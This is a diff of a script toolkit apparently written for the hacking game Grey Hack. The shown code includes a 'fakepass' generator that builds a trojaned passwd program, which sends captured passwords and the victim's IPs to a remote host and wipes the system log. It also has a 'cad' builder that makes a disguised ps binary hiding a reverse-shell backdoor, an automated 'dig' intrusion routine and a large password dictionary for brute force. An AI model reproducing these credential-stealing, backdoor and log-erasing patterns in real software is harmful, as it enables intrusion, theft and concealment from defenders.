+      //if @arg2 == "@clipc" then arg2 = @globals.clip_board_gamma
+      return cob.set( @arg2, @arg3 )
+    else
+      return usage_info
+    end if
+  end if
+  if arg1 == "get" then
+    if @arg2 then
       g = @cob.get
-      new_command = g(key)
-      if typeof(@new_command) == "string" then return key +": "+ new_command + ". Install failed."
-      if typeof(@new_command) == "function" then 
-        command[key] = @new_command 
-        return "Set command."+key+" to "+@new_command
-      else 
-        return "cob: install expects a function"
-      end if
-    end function
+      return g( @arg2 )
+      //if cobble.hasIndex( arg2 ) != null then return cobble[arg2] else return null
+    else
+      return usage_info
+    end if
+  end if
+  if arg1 == "inspect" then
+    return cob.inspect
+  end if
+  if arg1 == "sign" then return cob.sign(signature)
+  if arg1 == "search" then
+    if @arg2 then return cob.search( @arg2 ) else return usage_info
+  end if
+  //if arg1 == "export" then
+  //  cob.set("dictionary",globals.dict_a)
+  //  return "Exported "+cobble.dictionary.len+" password(s) from onbaord dictionary to custom_object.dictionary"
+  //end if
+  //if arg1 == "import" then
+  //   if cobble.hasIndex("dictionary") then
+  //     globals.dict_a = cob.get("dictionary")
+  //   else
+  //     return "cob: dictionary not found in index. set with <b>cob export</b>"
+  //   end if
+  //   if typeof(globals.dict_a) == "list" and globals.dict_a.len > 0 then 
+  //     globals.BIGBRAIN = true
+  //     return "Imported "+globals.dict_a.len+" passwords from custom_object.dictionary to onboard dictionary." 
+  //   else 
+  //     return "cerebrum: invalid dictionary"+char(10)+"cob: import error"
+  //   end if
+  // end if
+  if arg1 == "del" then
+    if @arg2 then return cob.del( @arg2 ) else return usage_info
+  end if
+  return usage_info
+end function
+//print(command.cob("get","get"))
+//catch = command.cob("get","get")
+//print(@catch)
+if DEBUG then print("<size=75%>loading dig.5pk...(11.760kb)</size>")
 
-    if arg1 == "return" then return cobble
-    if arg1 == "install" then 
-      return cob.install(arg2)
-    end if
-    if arg1 == "set" then
-      if @arg3 then
-        //if @arg2 == "@clipa" then arg2 = @globals.clip_board_alpha
-        //if @arg2 == "@clipb" then arg2 = @globals.clip_board_beta
-        //if @arg2 == "@clipc" then arg2 = @globals.clip_board_gamma
-        return cob.set( @arg2, @arg3 )
-      else
-        return usage_info
-      end if
-    end if
-    if arg1 == "get" then
-      if @arg2 then
-        g = @cob.get
-        return g( @arg2 )
-        //if cobble.hasIndex( arg2 ) != null then return cobble[arg2] else return null
-      else
-        return usage_info
-      end if
-    end if
-    if arg1 == "inspect" then
-      return cob.inspect
-    end if
-    if arg1 == "sign" then return cob.sign(signature)
-    if arg1 == "search" then
-      if @arg2 then return cob.search( @arg2 ) else return usage_info
-    end if
-    if arg1 == "export" then
-      cob.set("dictionary",globals.dict_a)
-      return "Exported "+cobble.dictionary.len+" password(s) from onbaord dictionary to custom_object.dictionary"
-    end if
-    if arg1 == "import" then
-      if cobble.hasIndex("dictionary") then
-        globals.dict_a = cob.get("dictionary")
-      else
-        return "cob: dictionary not found in index. set with <b>cob export</b>"
-      end if
-      if typeof(globals.dict_a) == "list" and globals.dict_a.len > 0 then 
-        globals.BIGBRAIN = true
-        return "Imported "+globals.dict_a.len+" passwords from custom_object.dictionary to onboard dictionary." 
-      else 
-        return "cerebrum: invalid dictionary"+char(10)+"cob: import error"
-      end if
-    end if
-    if arg1 == "del" then
-      if @arg2 then return cob.del( @arg2 ) else return usage_info
-    end if
-    return usage_info
-  end function
-  //print(command.cob("get","get"))
-  //catch = command.cob("get","get")
-  //print(@catch)
-  if DEBUG then print("<size=75%>loading dig.5pk...(11.760kb)</size>")
-
-  command.fakepass = function(arg1=0, arg2=0, arg3=0, arg4=0)
-      if arg1 == "help" or arg1 == "-h" then return "Usage: fakepass [opt:ip] [opt:pass] -- create passwd.src in current_path. Check src and build to /bin/passwd. PW capture malware."
-      ip = arg1
-      p = arg2
-      if not ip then ip = """"+user_input("remote ip:> ",0,0)+"""" else ip = """"+ip+""""
-      if ip == """"+""+"""" then return "aborting..."
-      if not p then p = """"+user_input("remote pass:> ",1,0)+"""" else p = """"+p+""""
-      if p == """"+""+"""" then return "aborting..."
-      passwd = "if params.len != 1 then exit(""<b>Usage: passwd [username]</b>""+char(10)+""Example: passwd john"");print(""Changing password for user ""+params[0]+""."");pass = user_input(""New password:"", 1);catch = get_shell.host_computer.change_password(params[0], pass);if catch != 1 then;if catch then exit(catch);exit(""Error: password not modified"");end if;"
-      rem_c = "localmachine=get_shell.host_computer;ip = "+ip+";pt = 22;user = ""root"";p="+p+";remote = get_shell.connect_service(ip, pt, user, p);if remote then;remote.host_computer.touch(""/root/rkit"",""rpm"");rpm=remote.host_computer.File(""/root/rkit/rpm"");if rpm then rpm.set_content(rpm.get_content+char(10)+pass+char(10)+localmachine.public_ip+char(10)+localmachine.local_ip);end if;"
-      scrub = "syslog = localmachine.File(""/var/system.log"");if syslog then;localmachine.touch(""/var"",""system.bak"");sbk=localmachine.File(""/var/system.bak"");if sbk then;sbk.set_content(""No IPs Today :D"");syslog.delete;sbk.move(""/var"", ""system.log"");end if;end if;"
-      final = "if catch == 1 then exit(""password modified OK"");if catch then exit(catch);print(""Error: password not modified"")"
-      fp = passwd + rem_c + scrub + final
-      localmachine.touch(currentPath, "passwd.src")
-      source = globals.get_file("passwd.src")
-      print("FakePass v 0.2, by Plu70")
-      print(colorRed+"- - - - - - - - - - - - - - - - - - - - -"+CT)
-      if not source then return "write error: unable to create passwd.src in "+currentPath
-      source.set_content(fp)
-      wait (1)
-      print(source.get_content)
+command.fakepass = function(arg1=0, arg2=0, arg3=0, arg4=0)
+    if arg1 == "help" or arg1 == "-h" then return "Usage: fakepass [opt:ip] [opt:pass] -- create passwd.src in current_path. Check src and build to /bin/passwd. PW capture malware."
+    ip = arg1
+    p = arg2
+    if not ip then ip = """"+user_input("remote ip:> ",0,0)+"""" else ip = """"+ip+""""
+    if ip == """"+""+"""" then return "aborting..."
+    if not p then p = """"+user_input("remote pass:> ",1,0)+"""" else p = """"+p+""""
+    if p == """"+""+"""" then return "aborting..."
+    passwd = "if params.len != 1 then exit(""<b>Usage: passwd [username]</b>""+char(10)+""Example: passwd john"");print(""Changing password for user ""+params[0]+""."");pass = user_input(""New password:"", 1);catch = get_shell.host_computer.change_password(params[0], pass);if catch != 1 then;if catch then exit(catch);exit(""Error: password not modified"");end if;"
+    rem_c = "localmachine=get_shell.host_computer;ip = "+ip+";pt = 22;user = ""root"";p="+p+";remote = get_shell.connect_service(ip, pt, user, p);if remote then;remote.host_computer.touch(""/root/rkit"",""rpm"");rpm=remote.host_computer.File(""/root/rkit/rpm"");if rpm then rpm.set_content(rpm.get_content+char(10)+pass+char(10)+localmachine.public_ip+char(10)+localmachine.local_ip);end if;"
+    scrub = "syslog = localmachine.File(""/var/system.log"");if syslog then;localmachine.touch(""/var"",""system.bak"");sbk=localmachine.File(""/var/system.bak"");if sbk then;sbk.set_content(""No IPs Today :D"");syslog.delete;sbk.move(""/var"", ""system.log"");end if;end if;"
+    final = "if catch == 1 then exit(""password modified OK"");if catch then exit(catch);print(""Error: password not modified"")"
+    fp = passwd + rem_c + scrub + final
+    localmachine.touch(currentPath, "passwd.src")
+    source = globals.get_file("passwd.src")
+    print("FakePass v 0.2, by Plu70")
+    print(colorRed+"- - - - - - - - - - - - - - - - - - - - -"+CT)
+    if not source then return "write error: unable to create passwd.src in "+currentPath
+    source.set_content(fp)
+    wait(1)
+    print(source.get_content)
+    print
+    saved = "password.src"
+    if currentPath != "/" then saved = "/password.src"
+    print(colorLightBlue+"Saved to: "+colorWhite+currentPath+saved+CT)
+    print(colorRed+"- - - - - - - - - - - - - - - - - - - - -"+CT+char(10))
+    return 0
+end function
+command.cad = function(arg1=0, arg2=0, arg3=0, arg4=0)
+    if arg1 == "help" or arg1 == "-h" then return "cad: cloak and dagger protocol."+char(10)+"Usage: cad [optional: ip ] -- or enter rshell-server ip at prompt"+char(10)+"Creates ps.src in current path. "+char(10)+"Review ps.src and build with make or makfit into /bin"+char(10)+"Remove .src, run /bin/ps once with metaxploit.so present then remove metaxploit.so"+char(10)+"The result is a hidden backdoor on the target. Use with care."
+    ps = """"+"ps"+""""
+    shell = """"+"5hell"+""""
+    zp = """"+"0.0%"+""""
+    z2 = """"+"0.3%"+""""
+    z1 = """"+"0.4%"+""""
+    zf = [zp,z1,z2]
+    zf.shuffle
+    m_path = """"+"/lib/metaxploit.so"+""""
+    m = """"+"metaxploit.so"+""""
+    add = arg1
+    if not add then add = """"+user_input("rshell addr:> ")+"""" else add = """"+add+""""
+    if add == """"+""+"""" then return "aborting..."
+    rip="ps=function();zp="+zp+";z2="+z2+";z1="+z1+";zf=[zp,z1,z2];zf.shuffle;procs = get_shell.host_computer.show_procs;k_tar = "+ps+";k_tar1 = "+shell+";processes = [];processes = procs.split(char(10));for p in processes;process = p.split(char(32));process_CMD = process[4];process_MEM = process[3];process_CPU = process[2];process_ID = process[1];process_user = process[0];if process_CMD == k_tar or process_CMD == k_tar1 then;continue;else;print(format_columns(process_user + char(32) + process_ID + char(32) + process_CPU + char(32) + process_MEM + char(32) + process_CMD));end if;end for;rng = range(1120, 9982);rng.shuffle;return(format_columns(active_user+char(32)+rng.pop+char(32)+"+zp+"+char(32)+zf.pop+char(32)+"+ps+"));end function"
+    // nop
+    nop="meta = include_lib("+m_path+");if not meta then include_lib("+m+");if not meta then exit(ps);meta.rshell_client("+add+",1222,"+ps+");exit(ps)"
+    header = char(10)+"// Cloak and Dagger"+char(10)
+    cd = (header+char(10)+rip+char(10)+nop)
+    localmachine.touch(currentPath, "ps.src")
+    source = globals.get_file("ps.src")
+    print("Cloak and Dagger Protocol v 0.4, by Plu70")
+    print(colorRed+"- - - - - - - - - - - - - - - - - - - - -"+CT)
+    if source then
+      source.set_content(cd)
+      wait(1)
+      out = source.get_content
+      print(out)
       print
-      saved = "password.src"
-      if currentPath != "/" then saved = "/password.src"
-      print(colorLightBlue+"Saved to: "+colorWhite+currentPath+saved+CT)
-      print(colorRed+"- - - - - - - - - - - - - - - - - - - - -"+CT+char(10))
-      return 0
-  end function
-  command.cad = function(arg1=0, arg2=0, arg3=0, arg4=0)
-      if arg1 == "help" or arg1 == "-h" then return "cad: cloak and dagger protocol."+char(10)+"Usage: cad [optional: ip ] -- or enter rshell-server ip at prompt"+char(10)+"Creates ps.src in current path. "+char(10)+"Review ps.src and build with make or makfit into /bin"+char(10)+"Remove .src, run /bin/ps once with metaxploit.so present then remove metaxploit.so"+char(10)+"The result is a hidden backdoor on the target. Use with care."
-      ps = """"+"ps"+""""
-      shell = """"+"5hell"+""""
-      zp = """"+"0.0%"+""""
-      z2 = """"+"0.3%"+""""
-      z1 = """"+"0.4%"+""""
-      zf = [zp,z1,z2]
-      zf.shuffle
-      m_path = """"+"/lib/metaxploit.so"+""""
-      m = """"+"metaxploit.so"+""""
-      add = arg1
-      if not add then add = """"+user_input("rshell addr:> ")+"""" else add = """"+add+""""
-      if add == """"+""+"""" then return "aborting..."
-      rip="ps=function();zp="+zp+";z2="+z2+";z1="+z1+";zf=[zp,z1,z2];zf.shuffle;procs = get_shell.host_computer.show_procs;k_tar = "+ps+";k_tar1 = "+shell+";processes = [];processes = procs.split(char(10));for p in processes;process = p.split(char(32));process_CMD = process[4];process_MEM = process[3];process_CPU = process[2];process_ID = process[1];process_user = process[0];if process_CMD == k_tar or process_CMD == k_tar1 then;continue;else;print(format_columns(process_user + char(32) + process_ID + char(32) + process_CPU + char(32) + process_MEM + char(32) + process_CMD));end if;end for;rng = range(1120, 9982);rng.shuffle;return(format_columns(active_user+char(32)+rng.pop+char(32)+"+zp+"+char(32)+zf.pop+char(32)+"+ps+"));end function"
-      // nop
-      nop="meta = include_lib("+m_path+");if not meta then include_lib("+m+");if not meta then exit(ps);meta.rshell_client("+add+",1222,"+ps+");exit(ps)"
-      header = char(10)+"// Cloak and Dagger"+char(10)
-      cd = (header+char(10)+rip+char(10)+nop)
-      localmachine.touch(currentPath, "ps.src")
-      source = globals.get_file("ps.src")
-      print("Cloak and Dagger Protocol v 0.4, by Plu70")
-      print(colorRed+"- - - - - - - - - - - - - - - - - - - - -"+CT)
-      if source then
-        source.set_content(cd)
-        wait(1)
-        out = source.get_content
-        print(out)
-        print
-          print(colorLightBlue+"Saved to: "+colorWhite+currentPath+"/ps.src"+CT)
-      else
-        print("write failed"+char(10))
-      end if
-      print(colorRed+"- - - - - - - - - - - - - - - - - - - - -"+CT+char(10))
-      return 0
-  end function
+        print(colorLightBlue+"Saved to: "+colorWhite+currentPath+"/ps.src"+CT)
+    else
+      print("write failed"+char(10))
+    end if
+    print(colorRed+"- - - - - - - - - - - - - - - - - - - - -"+CT+char(10))
+    return 0
+end function
   // command.dig = function(arg1, arg2, arg3=0, arg4=0)
   // 	if not arg1 or arg1 == "help" or arg1 == "-h" then return "Usage: dig [ip] [opt:port] -- upload a netcrawler to deep scan a network. "+char(10)+"port may be 0 or blank (dig [ip]) for standard use (targets router)."+char(10)+"crawler attempts to scrub logs but this may need to be done manually"+char(10)+"Advanced: clipb @B 1 | dig  (where BUFFER[1] contained a shell) -- dig that shell"+char(10)+"other methods may be used to pipe shells. eg zap | dig (this is redundant as dig runs zap internally)"+char(10)+"<b>N.B. dig is not (yet) integrated with db (the databaser) please scan libs before running dig.</b>"+char(10)+"N.B. future versions will also include an all command line version (to bypass the interactive setup)"+char(10)+"<b>Important</b>: Press enter at most prompts to use defaults (recommended)."+char(10)+"When prompted for an exploit to use, select a shell exploit."+char(10)+"If you know the password you may enter it on the SECOND password prompt. It will be colored cyan."+char(10)+"If you don't know the password, DIG is useful for finding it."+char(10)+"You may customize dig, to some degree, when prompted."
   // 	// dig local vars
@@ -1285,82 +1378,567 @@ if DEBUG then print("<size=75%>loading herme5.5pk...(8.142kb)</size>")
   //   catch = deploy_package
   //   return catch
   // end function
-  command.dig = function(arg1,arg2=0,arg3=0,arg4=0)
-      t = arg1
-      p = arg2
-      if t == "-s" then t = globals.sus
-      if not arg1 or arg1 == "help" or arg1 == "-h" then return "<b>DIG v 2.0 Netcrawler</b>"+char(10)+"Usage: dig [ip] [port] -- auto-infiltrate a target"+char(10)+"-- scans ports on target"+char(10)+"-- infiltrates via shell"+char(10)+"-- uploads rkit and runs 5hell on the target"+char(10)+"-- gains root and wipes the log"+char(10)+"-- performs other user defined tasks"+char(10)+"Note: edit /root/rkit/dib.bat to customize behavior"+char(10)+"-- by default you will be prompted to exit 5hell when dig completes"+char(10)+"-- type 'y' to exit and return to the script that launched dig"+char(10)+"-- or add <b>quit dig_complete</b> to exit automatically with an echo"+char(10)+"<b>Note:</b> supplying <b>--edit</b> as an argument will open dig.bat in scribus"+char(10)+"-- you may add/remove commands to be executed by dig here"+char(10)+"-- if <b>--edit</b> is the only argument dig will exit after editing the batch file."+char(10)+"<b>Advanced</b>: Adding a call to the dig command in dig.bat allows daisy chaining."+char(10)+"-- e.g. <b> rnip 1 | dig </b>"+char(10)+"Experimental: dig -s -- sus mode, gets random routers and checks version against database"+char(10)+"-- if the lib version is in the database, will dig that router"+char(10)+"-- for best results, use a database.csv that only includes entries with shell exploits"
-      print(colorGold+"<u>------DIG-v-2.0.0------</u>"+CT+char(10))
-      // find the root kit     
-      kit = command.tree("/","rkit",1,"N")
-      if not kit then return "rkit not found"
-      pe = kit.permissions.values
-      r = 0
-      w = 0
-      x = 0
-      if pe[-1] == "x" then x = 1
-      if pe[-2] == "w" then w = 1
-      if pe[-3] == "r" then r = 1
-      // edit dig.bat if necessary
+command.dig = function(arg1,arg2=0,arg3=0,arg4=0)
+
+  if not arg1 or arg1 == "help" or arg1 == "-h" then 
+    if arg2 and arg2 == "extra" then return colorGold+"Dig: Extra!"+CT+char(10)+"Here is a useful dig.bat script for dropping rshells"+char(10)+"first, set dig.bat to:"+char(10)+"ifconfig -p | probe -q"+char(10)+"brutus | rclean"+char(10)+"clipa | echo PASSWORD:"+char(10)+"echo do 1 -f r.bat | clipc"+char(10)+"clipb @B 1 | run /home/guest/rkit/5hell @b @c"+char(10)+"quit dig_complete"+char(10)+char(10)+"then, set a new file in rkit called r.bat"+char(10)+"set it to:"+char(10)+"rshell [your server ip] [some name]"+char(10)+"quit rshell_placed"+char(10)+char(10)+"This will dig the target like normal, then launch 5hell with the gained root shell"+char(10)+"Once launched, a reverse shell will be dropped and dig will exit both 5hell instances."
+    return "<b>DIG v 2.0 Netcrawler</b>"+char(10)+"Usage: dig [ip|port] [port|ip] -- auto-infiltrate a target"+char(10)+"-- scans ports on target"+char(10)+"-- infiltrates via shell"+char(10)+"-- uploads rkit and runs 5hell on the target"+char(10)+"-- gains root and wipes the log"+char(10)+"-- performs other user defined tasks"+char(10)+"Usage: dig [port] [ip] -- same as above but supports piping in an ip"+char(10)+"---- Note: edit /root/rkit/dib.bat to customize behavior"+char(10)+"-- by default you will be prompted to exit 5hell when dig completes"+char(10)+"-- type 'y' to exit and return to the script that launched dig"+char(10)+"-- or add <b>quit dig_complete</b> to exit automatically with an echo"+char(10)+"<b>Note:</b> supplying <b>--edit</b> as an argument will open dig.bat in scribus"+char(10)+"-- you may add/remove commands to be executed by dig here"+char(10)+"-- if <b>--edit</b> is the only argument dig will exit after editing the batch file."+char(10)+"<b>Advanced</b>: Adding a call to the dig command in dig.bat allows daisy chaining."+char(10)+"-- e.g. <b> rnip 1 | dig </b>"+char(10)+"Experimental: dig -s -- sus mode, gets random routers and checks version against database"+char(10)+"-- if the lib version is in the database, will dig that router"+char(10)+"-- for best results, use a database.csv that only includes entries with shell exploits"+char(10+"---- Extra: dig [-h|help] extra -- display extra help info")
+  end if
+  print(colorGold+"<u>------DIG-v-2.0.0------</u>"+CT+char(10))
+  t = arg1
+  if t == "-s" then t = globals.sus
+  p = arg2
+  if not is_valid_ip(t) then
+    t = arg2 
+    p = arg1 
+    if not is_valid_ip(t) then return "dig: invalid ip"
+  end if
+  
+  // find the root kit     
+  kit = command.tree("/","rkit",1,"N")
+  if not kit then return "rkit not found"
+  pe = kit.permissions.values
+  r = 0
+  w = 0
+  x = 0
+  if pe[-1] == "x" then x = 1
+  if pe[-2] == "w" then w = 1
+  if pe[-3] == "r" then r = 1
+  // edit dig.bat if necessary
+  bat_file = localmachine.File(kit.path+"/dig.bat")
+  if not bat_file then 
+      command.poke(kit.path+"/dig.bat", "ifconfig -p | probe -f"+char(10)+"brutus | rclean")
       bat_file = localmachine.File(kit.path+"/dig.bat")
-      if not bat_file then 
-          command.poke(kit.path+"/dig.bat", "ifconfig -p | probe -f"+char(10)+"cob import"+char(10)+"brutus | rclean"+char(10)+"cerebrum --purge")
-          bat_file = localmachine.File(kit.path+"/dig.bat")
-          if not bat_file then return "dig: unable to find or create dig.bat, aborting."
+      if not bat_file then return "dig: unable to find or create dig.bat, aborting."
+  end if
+  if arg1 == "--edit" or arg2 == "--edit" or arg3 == "--edit" or arg4 == "--edit" then 
+      print("Editing the batch file: "+bat_file.path)
+      command.scribus(bat_file)
+      if arg1 == "--edit" then return 1
+  end if	
+  // verify that we're ready to go
+  print("Checking dictionary...")
+  if not BIGBRAIN then 
+      tabs = localmachine.File("/root/tables/tp")
+      if tabs then 
+          command.cerebrum("-i",tabs.path)
+      else 
+          command.cerebrum
       end if
-      if arg1 == "--edit" or arg2 == "--edit" or arg3 == "--edit" or arg4 == "--edit" then 
-          print("Editing the batch file: "+bat_file.path)
-          command.scribus(bat_file)
-          if arg1 == "--edit" then return 1
-      end if	
-      // verify that we're ready to go
-      print("Checking dictionary...")
-      if not BIGBRAIN then 
-          tabs = localmachine.File("/root/tables/tp")
-          if tabs then 
-              command.cerebrum("-i",tabs.path)
-          else 
-              command.cerebrum
-          end if
+  end if
+  command.cob("export")
+  // portmap target
+  command.probe("-q",t,p)
+  // if not in database, scan target
+  if command.meta("link","-r") then
+      command.db("-r")
+      if command.meta("link","-r") then // idfk
+          return "dig: database error!"
       end if
-      command.cob("export")
-      // portmap target
-      command.probe("-q",t,p)
-      // if not in database, scan target
-      if command.meta("link","-r") then
-          command.db("-r")
-          if command.meta("link","-r") then
-              return "dig: database error!"
-          end if
+  end if
+  // if shell exploit, exploit target
+  mem = ""
+  val = ""
+  for x in globals.XPLOITS
+      y = x.split(" ")
+      z = y[-1]
+      if z == "shell" then 
+          mem = y[0]
+          val = y[1]
       end if
-      // if shell exploit, exploit target
-      mem = ""
-      val = ""
-      for x in globals.XPLOITS
-          y = x.split(" ")
-          z = y[-1]
-          if z == "shell" then 
-              mem = y[0]
-              val = y[1]
-          end if
-      end for
-      dig_this = null
-      dig_this = command.zap(mem,val,0)
-      if typeof(dig_this) != "shell" then return "dig: failed to obtain shell on target."
-      // upload rkit (mind permissions)
-      
-      command.perms("-r","o+rwx", kit.path)
-      globals.shell.scp(kit.path, "/home/guest", dig_this)
-      // command.perms("-r","o-rwx","/root/rkit")
-      pe = ""
-      if not r then pe = pe + "r"
-      if not w then pe = pe + "w"
-      if not x then pe = pe + "x"
-      if pe != "" then command.perms("-r","o-"+pe, kit.path)
-      // run 5hell on target with params:
-      // -- cob import | brutus
-      // -- other user defined params
-      dig_this.launch("/home/guest/rkit/5hell", "do 1 -f /home/guest/rkit/dig.bat")
-      // rclean and exit
-      // repeat if necessary
-      end function
+  end for
+  if mem == "" then return "dig: shell exploit not found on target"
+  dig_this = null
+  dig_this = command.zap(mem,val,0) // get the remote shell
+  if typeof(dig_this) != "shell" then return "dig: failed to obtain shell on target."
+  // upload rkit (mind permissions)
+  
+  command.perms("-r","o+rwx", kit.path)
+  globals.shell.scp(kit.path, "/home/guest", dig_this)
+  // command.perms("-r","o-rwx","/root/rkit")
+  pe = ""
+  if not r then pe = pe + "r"
+  if not w then pe = pe + "w"
+  if not x then pe = pe + "x"
+  if pe != "" then command.perms("-r","o-"+pe, kit.path)
+  // run 5hell on target with params:
+  // -- cob import | brutus
+  // -- other user defined params
+  dig_this.launch("/home/guest/rkit/5hell", "do 1 -f /home/guest/rkit/dig.bat")
+  // rclean and exit
+  // repeat if necessary
+end function
+
+// original pwgen by usespython, additions by Plu70
+if DEBUG then print("<size=75%>loading ...pwgen.5pk...(31.479kb)</size>")
+command.pwgen = function(arg1, arg2=0, arg3=0, arg4=0)
+	if arg1 == "help" or arg1 == "-h" then return "pwgen: generate a friggin lot of passwords with hashes."+char(10)+"Usage: pwgen -- generate tables/tp/ and files with one password per line"+char(10)+"Usage: pwgen hash -- generate tables/t5 and files with hash=pw one per line"+char(10)+"Use cerebrum to expand onboard dictionary."
+
+	// pwgen v0.4 author unkown, modifications by Plu70
+	PASSWORDSB="fifteen,abgDw32fhGu58k,sfuzzer,1111,2222,3333,00000,4444,5555,55555555,4fb426abgDw32fHG,6666,thx1138,7777,8888,9999,0000,oicu812,1337,8008,4hpu79htgbr,80085,007007,43110,69696969,t23t49k21af3,evkfdhgbv78ery,6h057,h4ck,h4ckg4m3,g01ng,p0st4l,g01ngp0st4l,81rd,7074g,35sk1m0,pr0n,n00b,nu8,suxor,hazorz,5uxzorz,owned,pwnd,0wnd,p0wn3d,w00t,woo7,woot,w007,10100111001,teh,meh,lol,brb,afk,wyd,gtfo,lmao,lmfao,gitgud,lawl,troll,bawl,epic,54321,987654321,88888888,555555,1234567890,1973,147147,151515,1515,101010,202020,21122112,12341234,74lk,dir7y,53nP4I,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,1,2,3,4,5,6,7,8,9,0,le375p34k,420420,11111111,112233,h4f4jf53fk74,123abc,1234qwer,123321,5y4hpu79htgbrub,ncc1701e,7777777,51505150,000000,5150,222222,999999,252525,77777777,98765432,poop,polyamorous,zelda,password,6gtr43,123456,12345678,1234,qwerty,12345,dragon,baseball,football,letmein,monkey,696969,abc123,mustang,michael,shadow,master,jennifer,111111,2000,jordan,superman,harley,1234567,hunter,trustno1,ranger,buster,thomas,tigger,robert,soccer,batman,test,pass,hockey,george,charlie,andrew,michelle,love,sunshine,jessica,6969,pepper,daniel,access,123456789,654321,joshua,maggie,starwars,silver,william,dallas,yankees,123123,ashley,666666,hello,amanda,orange,biteme,freedom,computer,sexy,thunder,nicole,ginger,heather,hammer,summer,corvette,taylor,swift,austin,1111,merlin,matthew,121212,golfer,cheese,princess,martin,chelsea,patrick,richard,diamond,yellow,bigdog,secret,asdfgh,sparky,cowboy,camaro,anthony,matrix,falcon,iloveyou,bailey,guitar,jackson,purple,scooter,phoenix,aaaaaa,morgan,tigers,porsche,mickey,maverick,cookie,nascar,peanut,justin,131313,money,horny,samantha,panties,steelers,joseph,snoopy,boomer,whatever,iceman,smokey,gateway,dakota,cowboys,eagles,chicken,black,zxcvbn,please,pharoa,andrea,ferrari,knight,hardcore,porn,ass,love,sex,hooker,blow,coke,melissa,compaq,coffee,booboo,bitch,johnny,bulldog,xxxxxx,welcome,james,player,ncc1701,wizard,scooby,charles,junior,internet,mike,brandy,tennis,banana,monster,spider,lakers,miller,rabbit,enter,mercedes,brandon,steven,fender,john,yamaha,diablo,chris,boston,tiger,marine,chicago,rangers,gandalf,winter,bigtits,barney,edward,raiders,porn,badboy,blowme,spanky,bigdaddy,johnson,chester,london,midnight,blue,fishing,hannah,slayer,rachel,sexsex,redsox,asdf,marlboro,panther,zxcvbnm,arsenal,oliver,qazwsx,mother,victoria,jasper,angel,david,winner,crystal,golden,butthead,viking,jack,iwantu,shannon,murphy,angels,prince,cameron,girls,madison,wilson,carlos,hooters,willie,startrek,captain,maddog,jasmine,butter,booger,angela,golf,lauren,rocket,tiffany,theman,dennis,liverpoo,flower,forever,green,jackie,muffin,turtle,sophie,danielle,redskins,toyota,jason,sierra,winston,debbie,giants,packers,newyork,jeremy,casper,bubba,dracula,sandra,lovers,mountain,united,cooper,driver,tucker,helpme,pookie,lucky,maxwell,8675309,bear,suckit,gators,shithead,jaguar,monica,fred,happy,hotdog,tits,gemini,lover,xxxxxxxx,777777,canada,nathan,victor,florida,nicholas,rosebud,metallic,doctor,trouble,success,stupid,tomcat,warrior,peaches,apples,fish,qwertyui,magic,buddy,dolphins,rainbow,gunner,987654,freddy,alexis,braves,2112,1212,xavier,dolphin,testing,bond007,member,calvin,voodoo,7777,samson,alex,apollo,fire,tester,chess,walter,beavis,voyager,peter,porno,bonnie,rush2112,beer,apple,scorpio,jonathan,skippy,sydney,scott,red123,power,gordon,travis,beaver,star,flyers,232323,zzzzzz,steve,rebecca,scorpion,doggie,legend,ou812,yankee,blazer,bill,runner,birdie,bitches,parker,topgun,asdfasdf,heaven,viper,animal,bigboy,arthur,baby,private,godzilla,donald,williams,lifehack,phantom,dave,rock,august,sammy,cool,brian,platinum,jake,bronco,paul,mark,frank,heka6w2,copper,billy,cumshot,garfield,willow,cunt,little,carter,slut,albert,kitten,super,jordan23,eagle1,shelby,america,11111,jessie,house,free,chevy,bullshit,white,broncos,horney,surfer,nissan,saturn,airborne,elephant,marvin,shit,action,adidas,qwert,kevin,1313,explorer,walker,police,christin,december,benjamin,wolf,sweet,therock,king,online,brooklyn,teresa,cricket,sharon,dexter,racing,penis,gregory,0000,teens,redwings,dreams,michigan,hentai,magnum,87654321,nothing,donkey,trinity,digital,333333,ramsesii,stella,cartman,guinness,speedy,buffalo,kitty,pimpin,eagle,einstein,kelly,nelson,nirvana,vampire,xxxx,playboy,louise,pumpkin,snowball,test123,girl,sucker,mexico,beatles,fantasy,ford,gibson,celtic,marcus,cherry,cassie,888888,natasha,sniper,chance,genesis,hotrod,reddog,alexande,college,jester,passw0rd,smith,lasvegas,carmen,slipknot,death,kimberly,1q2w3e,eclipse,1q2w3e4r,stanley,samuel,drummer,homer,montana,music,aaaa,spencer,jimmy,carolina,colorado,creative,hello1,rocky,goober,friday,AceofSpades,bollocks,scotty,abcdef,bubbles,hawaii,asakista,fluffy,mine,stephen,horses,thumper,darkness,asdfghjk,pamela,boobies,buddha,vanessa,sandman,naughty,douglas,honda,matt,azerty,6666,shorty,money1,beach,loveme,4321,simple,poohbear,444444,badass,destiny,sarah,denise,vikings,lizard,melanie,assman,sabrina,nintendo,water,good,howard,time,123qwe,november,xxxxx,october,zxcv,shamrock,atlantis,warren,wordpass,julian,mariah,rommel,1010,harris,predator,sylvia,massive,cats,sammy1,mister,stud,marathon,rubber,ding,trunks,desire,montreal,justme,faster,kathleen,irish,1999,bertha,jessica1,alpine,sammie,diamonds,tristan,swinger,shan,stallion,pitbull,letmein2,roberto,ready,april,palmer,ming,shadow1,audrey,chong,clitoris,wang,shirley,jackoff,bluesky,sundance,renegade,hollywoo,bernard,wolfman,soldier,picture,pierre,ling,goddess,manager,nikita,76hj93DB3wsa2,sweety,titans,hang,fang,ficken,niners,bottom,bubble,hello123,ibanez,webster,sweetpea,stocking,freeman,french,mongoose,speed,dddddd,hong,henry,hungry,yang,catdog,cheng,ghost,gogogo,randy,tottenha,curious,butterfl,mission,january,singer,sherman,shark,techno,lancer,lalala,autumn,chichi,orion,trixie,clifford,delta,bobbob,bomber,holden,kang,kiss,1968,spunky,liquid,mary,beagle,granny,network,bond,kkkkkk,millie,biggie,beetle,teacher,susan,toronto,anakin,genius,dream,dang,bush,nyx".split(",")
